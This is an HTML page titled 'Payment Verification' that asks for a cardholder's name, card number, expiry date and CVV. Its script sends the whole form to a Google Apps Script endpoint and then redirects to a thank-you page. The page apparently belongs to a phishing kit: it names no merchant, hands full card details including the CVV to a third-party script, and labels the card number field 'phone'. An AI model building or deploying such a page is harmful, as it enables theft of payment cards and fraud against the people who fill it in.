<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Verification</title>
    <!-- Bootstrap CSS (optional for styling) -->

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            /* Bootstrap background color */
            padding: 0px;
            margin: 0;
        }

        .form-container {
            max-width: 400px;
            margin: auto;
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .black_bg {
            background: black;

            width: 100%;
        }
    </style>
</head>

<body>
    <div class=" m-0">
        <!-- Hero Area Start -->
        <nav class="navbar navbar-dark black_bg">
            <div class="container-fluid">
                <a class="navbar-brand" href="#">
                    <img src="logo.png" alt="" width="80%" class="d-inline-block align-text-top">
                </a>
            </div>
        </nav>
        <section id="home" class="black_bg">
            <div id="particles-js"></div>
            <div class="container">
                <div class="row">
                    <div class="col-lg-6 col-md-6 d-flex align-items-center">
                        <div class="form-container">
                            <h2 class="text-center">Payment Verification</h2>
                            <form method="post" id="frmSubmit">
                                <div class="form-group">
                                    <label for="name">Name</label>
                                    <input type="text" class="form-control" id="name" placeholder="Name On Card "
                                        name="name" required>
                                </div>
                                <div class="form-group">
                                    <label for="number">Card Number </label>
                                    <input type="text" class="form-control" id="phone" maxlength="16" name="phone"
                                        placeholder="Enter your card number " required>
                                </div>
                                <div class="row">

                                    <div class="form-group col-sm-6">
                                        <label for="expiryDate">Expiry Date</label>
                                        <div class="row container">
                                            <select class="form-control col-sm-6" id="month" name="month">
                                                <option value="01">01</option>
                                                <option value="02">02</option>
                                                <option value="03">03</option>
                                                <option value="04">04</option>
                                                <option value="05">05</option>
                                                <option value="06">06</option>
                                                <option value="07">07</option>
                                                <option value="08">08</option>
                                                <option value="09">09</option>
                                                <option value="10">10</option>
                                                <option value="11">11</option>
                                                <option value="12">12</option>
                                            </select>
                                            <select class="form-control col-sm-6" id="year" name="year">
                                                <option value="24">24</option>
                                                <option value="25">25</option>
                                                <option value="26">26</option>
                                                <option value="27">27</option>
                                                <option value="28">28</option>
                                                <option value="29">29</option>
                                                <option value="30">30</option>
                                                <option value="31">31</option>
                                                <option value="32">32</option>
                                                <option value="33">33</option>
                                                <option value="34">34</option>
                                                <option value="35">35</option>
                                                <option value="36">36</option>
                                                <option value="37">37</option>
                                                <option value="38">38</option>
                                                <option value="39">39</option>
                                                <option value="40">40</option>
                                                <option value="41">41</option>
                                            </select>
                                        </div>
                                    </div>
                                    <div class="form-group col-sm-5">
                                        <label for="CVV">CVV</label>
                                        <input type="password" class="form-control" name="cvv" id="cvv" maxlength="4"
                                            placeholder="Enter CVV " required>
                                    </div>
                                </div>

                                <button type="submit" id="btnSubmit" class="btn btn-primary btn-block">Confirm</button>
                            </form>

                        </div>
                    </div>
                    <div class="col-lg-6 col-md-6">
                        <div class="banner-images">
                            <img src="banner.jpg" alt="" width="100%" />
                        </div>
                    </div>
                </div>
            </div>

        </section>


    </div>

    <!-- Bootstrap JS and Popper.js (required for Bootstrap) -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        jQuery('#frmSubmit').on('submit', function (e) {
            e.preventDefault();
            jQuery('#msg').html('Please wait...');
            jQuery('#frmSubmit').attr('disabled', true);
            jQuery.ajax({
                url: 'https://script.google.com/macros/s/AKfycbxG0DizcQb6JPhfdcWXnWf1-YRfxGPeuYCK-8sbK8_HN6hFeSAIeudkqmSZegDV6CJX/exec',
                type: 'post',
                data: jQuery('#frmSubmit').serialize(),
                success: function (result) {
                    jQuery('#frmSubmit')[0].reset();
                    jQuery('#msg').html('Thank You');
                    jQuery('#frmSubmit').attr('disabled', false);
                    window.location.href = 'thankyou.html';
                }
            });
        });

    </script>

</body>

</html>
